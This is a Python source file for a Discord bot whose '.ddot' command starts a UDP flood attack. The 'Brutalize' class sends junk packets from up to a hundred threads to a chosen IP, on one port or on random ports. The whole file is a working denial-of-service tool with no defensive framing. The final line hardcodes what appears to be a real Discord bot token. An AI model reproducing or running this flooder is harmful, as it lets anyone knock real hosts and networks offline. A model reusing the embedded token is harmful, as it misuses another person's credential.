import discord
from discord.ext import commands
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep

# Configuración del bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix=".", intents=intents)

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"Sent {round(size)} Mb/s - Total: {round(self.total, 1)} Gb", end='\r')

            now2 = time()
            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

# Comando de Discord para iniciar el ataque
@bot.command()
async def ddot(ctx, ip: str, port: int = None, force: int = 1250, threads: int = 100):
    try:
        if ip.count('.') != 3:
            raise ValueError("Invalid IP format")
        # Validación del puerto
        if port and not (1 <= port <= 65535):
            raise ValueError("Port must be between 1 and 65535")
        # Validación de los bytes y threads
        if not (isinstance(force, int) and isinstance(threads, int)):
            raise ValueError("Bytes and threads must be integers")

        await ctx.send(f"Starting attack on {ip}:{port if port else 'All ports'} with {force} bytes and {threads} threads...")
        
        # Iniciar el ataque
        brute = Brutalize(ip, port, force, threads)
        try:
            brute.flood()
            await ctx.send(f"Attack on {ip}:{port if port else 'All ports'} started successfully.")
        except Exception as e:
            brute.stop()
            await ctx.send(f"An error occurred: {str(e)}")
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

# Aquí debes poner tu token de Discord
bot.run('MTE3OTgzNjc4NjY4NDQ4MTYyNw.Ga2t9T.AP0X-vZB8u_hBKq8Og2apodpV1N4smLwwpofJc')
